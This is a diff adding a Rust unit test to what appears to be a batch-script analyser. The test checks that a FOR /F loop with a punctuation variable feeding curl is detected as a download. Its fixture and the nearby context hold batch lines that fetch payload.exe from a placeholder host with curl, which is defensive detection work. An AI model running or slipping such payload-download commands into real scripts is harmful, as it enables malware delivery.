@@ -15118,6 +15118,27 @@ for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
     }
 
     #[test]
+    fn for_f_allows_punctuation_loop_variable() {
+        use crate::traits::Trait;
+        let script = br#"echo https://for-f-punct-var.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%# in (url.txt) do curl -o payload.exe %%#"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-punct-var.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F punctuation loop variable did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_curl_public_ip_endpoint_feeds_later_variable() {
         use crate::traits::Trait;
         let script = br#"setlocal EnableDelayedExpansion
